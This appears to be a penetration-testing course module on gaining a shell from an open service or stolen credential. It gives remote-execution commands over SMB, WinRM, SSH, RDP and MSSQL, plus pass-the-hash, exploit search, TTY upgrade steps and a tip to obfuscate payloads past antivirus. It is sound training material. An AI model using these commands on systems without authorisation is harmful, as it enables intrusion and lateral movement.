---
title: Turn an open service into a shell
slug: attack-a-service-to-a-shell
area: initial-access
module: 11
order: 1
goal: Go from "a port is open" (or "I have a credential") to running commands on the box.
summary: How to convert an open service or a found credential into a shell — authenticated exec over SMB/WinRM/SSH/RDP/MSSQL, or a known-vulnerability exploit, then upgrade to a stable shell.
prereqs: [An open service from your nmap scan, A credential or hash (or a known vuln for an unauthenticated service), A listener if you go the reverse-shell route]
seeAlso: [tool:netexec, tool:evil-winrm, tool:impacket, tool:attacking-services, tool:reverse-shells, map:start, map:password-cracking]
references:
  - HackTricks: pentesting SMB | https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-smb/index.html
  - The Hacker Recipes: NTLM movement | https://www.thehacker.recipes/ad/movement/ntlm/
---

A shell comes one of two ways: **authenticated execution** through a management service (you have a credential), or an **exploit** of a vulnerable service (you don't). Match the route to what your scan and loot give you.

## With a credential — pick the service

```bash
nxc smb TARGET -u user -p pass -x 'whoami'        # SMB exec; (Pwn3d!) = local admin
evil-winrm -i TARGET -u user -p pass              # WinRM interactive shell (5985)
psexec.py user@TARGET                             # SMB -> SYSTEM service shell
wmiexec.py user@TARGET                            # quieter, runs as the user
```

```bash
ssh user@TARGET                                   # Linux (22)
mssqlclient.py user@TARGET -windows-auth          # MSSQL (1433): then enable xp_cmdshell
xfreerdp /v:TARGET /u:user /p:pass /cert:ignore   # RDP (3389)
```

Only a hash, not a password? Every tool above takes `-H`/`-hashes` — see Pass-the-Hash.

## Without a credential — exploit the service

Identify the exact product and version, then search for a public exploit.

```bash
searchsploit <product version>
nmap -sV -p PORT --script vuln TARGET
msfconsole -q -x 'search <product>; use <module>'
```

Weak or default creds are the other unauthenticated way in — spray them (see the password-attacks map) before reaching for an exploit.

## Upgrade to a stable shell

A raw reverse shell is fragile — fix the TTY so you get tab-completion, arrows and Ctrl-C.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl-Z ; stty raw -echo; fg ; export TERM=xterm
```

## If it fails

- **Auth works but no shell**: the account isn't admin (SMB shows no `Pwn3d!`, WinRM denies) — you can still read/enumerate; find a privesc or another account.
- **Exploit won't land**: wrong version/architecture, or a patch — re-check `-sV`, try a different PoC, confirm your listener and payload match the target OS.
- **Shell dies instantly**: AV killed the payload, or the service restarted — use an encoded/obfuscated payload or a living-off-the-land binary.

## Verify

```bash
id        # Linux
whoami    # Windows
```

You have a foothold — now escalate (Windows/Linux quick-ops maps) or hunt credentials.
